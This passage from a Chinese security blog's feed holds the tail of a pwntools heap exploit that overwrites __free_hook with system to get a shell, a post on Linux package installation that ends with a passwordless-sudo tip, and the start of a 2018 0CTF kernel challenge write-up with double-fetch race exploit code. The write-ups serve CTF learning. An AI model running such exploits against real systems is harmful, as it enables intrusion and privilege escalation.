class="number">5</span>, <span class="number">0x80</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">heap_base = heap_addr - <span class="number">0x145a0</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">6</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">7</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">7</span>, <span class="number">0x30</span>)</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0x30</span>)</span><br><span class="line">target = heap_base + <span class="number">0x14930</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    hint(target)</span><br><span class="line">edit(<span class="number">6</span>, p64(libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">hint(heap_base + <span class="number">0x10</span>)</span><br><span class="line">hint(heap_base + <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">9</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">10</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">11</span>, <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">11</span>, p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">edit(<span class="number">6</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">move(<span class="number">7</span>, <span class="number">6</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><p>剩下的题本来想复现musl了但是没有题目，然后就是其他题目我是真的要疯了，md全是cpp我属实需要下去再学习一段时间，后面复现D3的kernel。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;以前做pwn题比较在意的是利用方式以及利用原理，很少静下心来去逆向一个程序，也就导致我现在逆向能力相对来说很差，在遇到RCTF这种题目极其复杂的内容我可能就直接放弃了，然后比赛完就看别人wp，别人说了流程之后我就会想，这么简单我为什么当时不做呢？所以现在打算多多练题训练自己</summary>
      
    
    
    
    <category term="比赛复现" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="chunk overlapping" scheme="https://cv196082.gitee.io/tags/chunk-overlapping/"/>
    
  </entry>
  
  <entry>
    <title>linux软件安装时到底在做什么?</title>
    <link href="https://cv196082.gitee.io/2022/04/07/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E6%97%B6%E5%88%B0%E5%BA%95%E5%9C%A8%E5%81%9A%E4%BB%80%E4%B9%88/"/>
    <id>https://cv196082.gitee.io/2022/04/07/linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E6%97%B6%E5%88%B0%E5%BA%95%E5%9C%A8%E5%81%9A%E4%BB%80%E4%B9%88/</id>
    <published>2022-04-07T02:22:57.000Z</published>
    <updated>2022-04-07T03:37:08.208Z</updated>
    
    <content type="html"><![CDATA[<p>除了CTF外我其实还是一个特别喜欢搞linux的一个垃圾，在2020年11月份左右我将电脑系统换到了kali并且因为当时不会装双系统把windows搞没了，不过用过一段时间发现linux的操作逻辑更加的符合我。</p><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><p>linux的依赖问题一直是被人诟病的，尤其是debian系的(arch系我感觉几乎没遇到过依赖问题)，在进行安装的总是会出来这个套那个，导致我以前使用ubuntu时安装一个程序可能得花上一下午的时间，而且几乎全部时间都在解决依赖问题。</p><p>那么问题来了，<strong>依赖到底是什么？</strong></p><p>首先需要说明的是windows和linux其实都是存在依赖问题的，比如我以前在windows虚拟机里面运行ida的时候就会出现依赖问题，不过网上都有现成的包直接安装就好。虽然按理来说linux也存在依赖的包，但是为什么linux的依赖问题会比windows更加经常发生呢？</p><p>举个例子：现在运行一个程序需要依赖a-1，我使用windows找到了这个依赖的安装包，实际上这个安装包安装下来的是a-1,a-2,,,,a-30。但是纯纯的linux只会帮你安装a-1，下一次遇到需要a-12的时候，windows不会报错但是linux又需要安装另外版本的依赖了。</p><p>上面的看过了之后就大概对linux的依赖问题有一定了解了，那么为了更好的了解依赖问题我们首先需要知道</p><h2 id="安装一个包的过程"><a href="#安装一个包的过程" class="headerlink" title="安装一个包的过程"></a>安装一个包的过程</h2><p><img src="/images/image-20220407105433893.png" alt="image-20220407105433893"></p><p>首先可以看到linux和window的不同，linux的安装包是真的非常单纯的压缩整合到一起，最后由包管理器将不同功能的文件放到不同目录。</p><p>在上面这张图里面我们需要重点关注的data.tar.xz</p><p><img src="/images/image-20220407105631804.png" alt="image-20220407105631804"></p><p>查看其内部可以发现就是一个usr目录</p><p><img src="/images/image-20220407105659439.png" alt="image-20220407105659439"></p><p>这里就是我们熟悉的desktop，也就是桌面图标</p><p><img src="/images/image-20220407105758879.png" alt="image-20220407105758879"></p><p>可以看到bin目录是一个链接符号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcdy@archlinux /mnt/5F2601400CC8834D/save/usr/bin % ls -l typora </span><br><span class="line">lrwxrwxrwx 1 root root 22 Apr  7 10:51 typora -&gt; ../share/typora/Typora</span><br></pre></td></tr></table></figure><p>可以看到就是链接到了一个可执行文件，当我们双击文件就可以打开typora了。</p><p>找到可执行程序之后只需要使用ldd即可查看需要的依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">tcdy@archlinux ..5F2601400CC8834D/save/usr/share/typora % ldd Typora </span><br><span class="line">linux-vdso.so.1 (0x00007ffe581fd000)</span><br><span class="line">libffmpeg.so =&gt; /mnt/5F2601400CC8834D/save/usr/share/typora/./libffmpeg.so (0x00007fefa6baa000)</span><br><span class="line">libdl.so.2 =&gt; /usr/lib/libdl.so.2 (0x00007fefa6b7e000)</span><br><span class="line">libpthread.so.0 =&gt; /usr/lib/libpthread.so.0 (0x00007fefa6b79000)</span><br><span class="line">libgobject-2.0.so.0 =&gt; /usr/lib/libgobject-2.0.so.0 (0x00007fefa6b1a000)</span><br><span class="line">libglib-2.0.so.0 =&gt; /usr/lib/libglib-2.0.so.0 (0x00007fefa69dc000)</span><br><span class="line">libxshmfence.so.1 =&gt; /usr/lib/libxshmfence.so.1 (0x00007fefa69d7000)</span><br><span class="line">libgio-2.0.so.0 =&gt; /usr/lib/libgio-2.0.so.0 (0x00007fefa6807000)</span><br><span class="line">libnss3.so =&gt; /usr/lib/libnss3.so (0x00007fefa66d4000)</span><br><span class="line">libnssutil3.so =&gt; /usr/lib/libnssutil3.so (0x00007fefa66a1000)</span><br><span class="line">libsmime3.so =&gt; /usr/lib/libsmime3.so (0x00007fefa6678000)</span><br><span class="line">libnspr4.so =&gt; /usr/lib/libnspr4.so (0x00007fefa6636000)</span><br><span class="line">libatk-1.0.so.0 =&gt; /usr/lib/libatk-1.0.so.0 (0x00007fefa660c000)</span><br><span class="line">libatk-bridge-2.0.so.0 =&gt; /usr/lib/libatk-bridge-2.0.so.0 (0x00007fefa65d4000)</span><br><span class="line">libdbus-1.so.3 =&gt; /usr/lib/libdbus-1.so.3 (0x00007fefa6581000)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>可以看到这里甚至于有依赖就在当前目录寻找了</p><p><img src="/images/image-20220407110347849.png" alt="image-20220407110347849"></p><p>可以看到这里的文件其实也就包含了上面所需要的一部分依赖，其实这也是很多windows程序的思路，如果程序存在很多不常见到的依赖就会把依赖和程序捆绑起来进行安装。</p><p>其实到这里大家都大概知道了包管理器在安装程序时到底是干了什么，其实就是将不同功能的程序放进了不同目录。</p><h2 id="AUR-PKGBUILD的编写"><a href="#AUR-PKGBUILD的编写" class="headerlink" title="AUR-PKGBUILD的编写"></a>AUR-PKGBUILD的编写</h2><p>一样拿typora举例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Maintainer: Jonas Bögle &lt;aur@iwr.sh&gt;</span></span><br><span class="line"><span class="comment"># Contributor: Jonathan Duck &lt;duckbrain30@gmail.com&gt;</span></span><br><span class="line"></span><br><span class="line">_pkgname=typora</span><br><span class="line">pkgname=<span class="string">&quot;<span class="variable">$_pkgname</span>-free&quot;</span></span><br><span class="line">pkgver=0.11.18</span><br><span class="line">pkgrel=2</span><br><span class="line">pkgdesc=<span class="string">&quot;A minimal markdown editor and reader.&quot;</span></span><br><span class="line">arch=(<span class="string">&#x27;x86_64&#x27;</span>)</span><br><span class="line">filename=<span class="string">&quot;typora_<span class="variable">$&#123;pkgver&#125;</span>_amd64.deb&quot;</span></span><br><span class="line">license=(<span class="string">&#x27;custom:&quot;Copyright (c) 2015 Abner Lee All Rights Reserved.&quot;&#x27;</span>)</span><br><span class="line">url=<span class="string">&quot;https://typora.io/&quot;</span></span><br><span class="line">depends=(<span class="string">&#x27;gtk3&#x27;</span> <span class="string">&#x27;libxss&#x27;</span>)</span><br><span class="line">optdepends=(</span><br><span class="line"><span class="string">&#x27;noto-fonts-emoji: Or some other emoji font to see emojis&#x27;</span></span><br><span class="line"><span class="string">&#x27;pandoc: Import/export for extra file formats&#x27;</span>)</span><br><span class="line">provides=(<span class="string">&quot;<span class="variable">$_pkgname</span>&quot;</span>)</span><br><span class="line">conflicts=(<span class="string">&quot;<span class="variable">$_pkgname</span>&quot;</span>)</span><br><span class="line"><span class="built_in">source</span>=(<span class="string">&quot;https://typora.io/linux/<span class="variable">$filename</span>&quot;</span>)</span><br><span class="line">sha512sums=(<span class="string">&#x27;8933cb4eab13a37719a3771d14a7a3f5951f6bbce06381ffe37ad5bc3029efed3878723427a4e97b83dbc1d7ccc43b31551b0c336663c843f0e685f8a4e2390e&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">package</span></span>() &#123;</span><br><span class="line">bsdtar -xf data.tar.xz -C <span class="string">&quot;<span class="variable">$pkgdir</span>/&quot;</span></span><br><span class="line">rm -rf <span class="string">&quot;<span class="variable">$pkgdir</span>/usr/share/lintian/&quot;</span></span><br><span class="line">chmod 4755 <span class="string">&quot;<span class="variable">$pkgdir</span>/usr/share/typora/chrome-sandbox&quot;</span></span><br><span class="line"><span class="comment"># Remove write permission for group/other</span></span><br><span class="line">chmod -R go-w <span class="string">&quot;<span class="variable">$pkgdir</span>/usr/share/typora/resources/node_modules&quot;</span></span><br><span class="line">sed -i <span class="string">&#x27;/Change Log/d&#x27;</span> <span class="string">&quot;<span class="variable">$pkgdir</span>/usr/share/applications/typora.desktop&quot;</span></span><br><span class="line">find <span class="string">&quot;<span class="variable">$pkgdir</span>&quot;</span> -<span class="built_in">type</span> d -<span class="built_in">exec</span> chmod 755 &#123;&#125; \;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的名字，版本，架构什么就不说了，主要关注下面的内容。</p><p>首先是这里source，很明显就是再往上的这个文件的deb包，下面sha512sums就是检验码。</p><p><strong>srcdir</strong></p><p>​    <em>makepkg</em>将会把源文件解压到此文件夹或在此文件夹中生成指向 PKGBUILD 里 source 数组中文件的软连接。</p><p><strong>pkgdir</strong></p><p>​    makepkg会把该文件夹当成系统根目录，并将软件安装在此文件夹下。</p><p>重点就是下面的打包函数，可以看到首先是解压了data.tar.xz这个包带pkgdir。后面就是删除个东西，然后改变权限(可以看到typora是Electron)，下面就是创建图标，最后就是修改pkgdir下目录的权限为755。</p><p>关于aur的更多可以看<a class="link"   href="https://wiki.archlinux.org/title/Creating_packages" >archwiki<i class="fas fa-external-link-alt"></i></a></p><h2 id="sudo免密码"><a href="#sudo免密码" class="headerlink" title="sudo免密码"></a>sudo免密码</h2><p>这个是我每次装完系统必干的一件事情，不过经常忘，而且网上的很多东西都不能实现。所以这里自己记录一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root ALL=(ALL:ALL) ALL</span><br><span class="line">your_username ALL=(ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure><p>删除<code>/etc/sudoers.d/10-installer</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实程序的安装并没有我以前想象的那么复杂，至少对于linux来说是这样的。如果遇到什么有趣的linux操作我也会及时分享。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;除了CTF外我其实还是一个特别喜欢搞linux的一个垃圾，在2020年11月份左右我将电脑系统换到了kali并且因为当时不会装双系统把windows搞没了，不过用过一段时间发现linux的操作逻辑更加的符合我。&lt;/p&gt;
&lt;h2 id=&quot;依赖&quot;&gt;&lt;a href=&quot;#依赖&quot; c</summary>
      
    
    
    
    <category term="搞机" scheme="https://cv196082.gitee.io/categories/%E6%90%9E%E6%9C%BA/"/>
    
    
    <category term="deb" scheme="https://cv196082.gitee.io/tags/deb/"/>
    
    <category term="aur" scheme="https://cv196082.gitee.io/tags/aur/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn基础[2]</title>
    <link href="https://cv196082.gitee.io/2022/03/24/kernel-pwn%E5%9F%BA%E7%A1%80-2/"/>
    <id>https://cv196082.gitee.io/2022/03/24/kernel-pwn%E5%9F%BA%E7%A1%80-2/</id>
    <published>2022-03-24T06:47:50.000Z</published>
    <updated>2022-03-24T06:47:06.961Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2018-0CTF-Finals-Baby-Kernel"><a href="#2018-0CTF-Finals-Baby-Kernel" class="headerlink" title="2018 0CTF Finals Baby Kernel"></a>2018 0CTF Finals Baby Kernel</h2><p>这次题目的附件只有驱动和文件系统没有bzImage</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcdy@arch-linux ..study_kernel/2018_0CTFFinalsBabyKernel % strings baby.ko | grep vermagic=</span><br><span class="line">vermagic=4.15.0-22-generic SMP mod_unload</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcdy@196082:~/Desktop/download/study_kernel$ sudo apt download linux-image-4.15.0-22-generic </span><br><span class="line">Get:1 https://mirrors.ustc.edu.cn/ubuntu bionic-updates/main amd64 linux-image-4.15.0-22-generic amd64 4.15.0-22.24 [7,875 kB]</span><br><span class="line">Fetched 7,875 kB <span class="keyword">in</span> 1s (5,913 kB/s)</span><br><span class="line">tcdy@196082:~/Desktop/download/study_kernel$ ar x linux-image-4.15.0-22-generic_4.15.0-22.24_amd64.deb</span><br><span class="line">tcdy@196082:~/Desktop/download/study_kernel$ tar -xf data.tar.xz</span><br><span class="line">tcdy@196082:~/Desktop/download/study_kernel$ <span class="built_in">cd</span> boot/</span><br><span class="line">tcdy@196082:~/Desktop/download/study_kernel/boot$ file vmlinuz-4.15.0-22-generic </span><br><span class="line">vmlinuz-4.15.0-22-generic: Linux kernel x86 boot executable bzImage, version 4.15.0-22-generic (buildd@lgw01-amd64-013) <span class="comment">#24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018, RO-rootFS, swap_dev 0x7, Normal VGA</span></span><br></pre></td></tr></table></figure><h3 id="分析驱动"><a href="#分析驱动" class="headerlink" title="分析驱动"></a>分析驱动</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">baby_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp-5Ch] [rbp-5Ch]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  v5 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6666</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x1337</span></span><br><span class="line">         &amp;&amp; (<span class="keyword">unsigned</span> __int8)_chk_range_not_ok(v2, <span class="number">16LL</span>, *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">4952</span>)) != <span class="number">1</span></span><br><span class="line">         &amp;&amp; (<span class="keyword">unsigned</span> __int8)_chk_range_not_ok(</span><br><span class="line">                               *(_QWORD *)v5,</span><br><span class="line">                               *(<span class="keyword">int</span> *)(v5 + <span class="number">8</span>),</span><br><span class="line">                               *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">4952</span>)) != <span class="number">1</span></span><br><span class="line">         &amp;&amp; *(_DWORD *)(v5 + <span class="number">8</span>) == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v5 + i) != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">14LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先可以看到函数分为两部分，第一部分就是打印出flag的地址，第二部分则是经过两次检验之后进入下面的逐字节对比。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">bool</span> v3; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  v3 = __CFADD__(a2, a1);</span><br><span class="line">  v4 = a2 + a1;</span><br><span class="line">  <span class="keyword">return</span> v3 || a3 &lt; v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个验证函数些许看不懂，直接看汇编好一点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000000 55                            push    rbp</span><br><span class="line">.text:0000000000000001 48 01 F7                      add     rdi, rsi</span><br><span class="line">.text:0000000000000004 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000000007 72 08                         jb      short loc_11</span><br><span class="line">.text:0000000000000007</span><br><span class="line">.text:0000000000000009 48 39 FA                      cmp     rdx, rdi</span><br><span class="line">.text:000000000000000C 0F 92 C0                      setb    al</span><br><span class="line">.text:000000000000000F 5D                            pop     rbp</span><br><span class="line">.text:0000000000000010 C3                            retn</span><br><span class="line">.text:0000000000000010</span><br><span class="line">.text:0000000000000011                               ; -----------------------------------------------------------------------</span><br><span class="line">.text:0000000000000011</span><br><span class="line">.text:0000000000000011                               loc_11:                    ; CODE XREF: __chk_range_not_ok+7↑j</span><br><span class="line">.text:0000000000000011 B8 01 00 00 00                mov     eax, 1</span><br><span class="line">.text:0000000000000016 5D                            pop     rbp</span><br><span class="line">.text:0000000000000017 C3                            retn</span><br></pre></td></tr></table></figure><p>就是第一个参数和第二个参数的和必须小于第三个参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; (<span class="keyword">unsigned</span> __int8)_chk_range_not_ok(v2, <span class="number">16LL</span>, *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">4952</span>)) != <span class="number">1</span></span><br><span class="line">    &amp;&amp; (<span class="keyword">unsigned</span> __int8)_chk_range_not_ok(</span><br><span class="line">    *(_QWORD *)v5,</span><br><span class="line">    *(<span class="keyword">int</span> *)(v5 + <span class="number">8</span>),</span><br><span class="line">    *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">4952</span>)) != <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/images/kernel-pwn%E5%9F%BA%E7%A1%80-2/image-20220324120500632.png" alt="image-20220324120500632"></p><p>可以看到这里其实就是看看传入的参数是否是用户态</p><p>这道提分为两种利用方式，这里都提一下(毕竟我都还不会)</p><h3 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h3><p>这一利用方式可以看做是条件竞争，这里是两次验证，第一次验证是否为用户态，第二次逐字检查flag，那么要是在第一检查结束后将地址换成正真的flag地址，那么后一个验证即可绕过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> finished = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> Time = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">size_t</span> flag_addr;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fake_flag</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> *addr;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_flag_addr</span><span class="params">(<span class="keyword">void</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fake_flag</span> *<span class="title">a</span> =</span> s;</span><br><span class="line">    <span class="keyword">while</span> (finished == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        a-&gt;addr = flag_addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(argc, argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fake_flag</span> <span class="title">target</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; record.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> flag_addr_fd = open(<span class="string">&quot;./record.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    lseek(flag_addr_fd, <span class="number">-0x1000</span>, SEEK_END);</span><br><span class="line">    read(flag_addr_fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    close(flag_addr_fd);</span><br><span class="line">    <span class="keyword">char</span> *idx;</span><br><span class="line">    idx = <span class="built_in">strstr</span>(buf, <span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    flag_addr = strtoull(idx + <span class="number">16</span>, idx + <span class="number">32</span>, <span 